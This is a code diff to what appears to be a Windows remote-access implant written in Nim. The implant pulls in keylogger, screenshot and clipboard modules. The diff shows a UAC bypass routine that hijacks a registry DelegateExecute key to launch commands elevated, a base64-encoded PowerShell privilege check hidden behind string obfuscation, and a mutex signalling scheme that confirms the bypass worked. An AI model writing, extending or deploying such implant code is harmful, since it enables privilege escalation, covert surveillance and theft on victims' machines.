@@ -1,7 +1,7 @@
 # Internal imports
 import ../config
 import ../common
-import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger, namedpipe]
+import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger, mutex]
 # Internal imports
 import std/[tables, nativesockets, json]
 import winim/[lean, com]
@@ -43,7 +43,7 @@ proc speak(text: string): bool
 
 # Helpers
 proc get_windows_agent_id*(): string
-proc is_elevated(): string
+proc is_elevated_str(): string
 
 # Globals
 let client = newHttpClient(userAgent=get_windows_agent_id())
@@ -84,7 +84,7 @@ proc collect_data(): bool =
     except:
         is_admin = could_not_retrieve
     try:
-        is_elevated = is_elevated()
+        is_elevated = is_elevated_str()
     except:
         is_elevated = could_not_retrieve
     try: 
@@ -459,9 +459,10 @@ proc uac_bypass(bypass_method: string, cmd: string): bool =
         return false
     
     if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
-        sleep(2000)
+        sleep(1000)
         if execCmdEx(launch, options={poDaemon}).exitCode == 0:
-            if np_client_try_connect():
+            sleep(2000)
+            if is_elevated_mutex_enabled():
                 is_success = true
             else:
                 is_success = false
@@ -545,7 +546,7 @@ proc get_windows_agent_id*(): string =
     return uaid.toLower()
 
 
-proc is_elevated(): string =
+proc is_elevated_str(): string =
     return execute_encoded_powershell(protectString("KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApACkALgBJAHMASQBuAFIAbwBsAGUAKAAiAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACkA"))
 
 
@@ -556,8 +557,9 @@ proc is_elevated(): string =
 
 proc windows_start*(): void =
 
-    # if spawned via uav bypass - let the unelevated agent know
-    np_server()
+    # if elevated - let the unelevated agent know (needed for uac bypass commands)
+    if is_elevated_str().strip() == protectString("True"):
+        discard create_elevated_mutex()
 
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
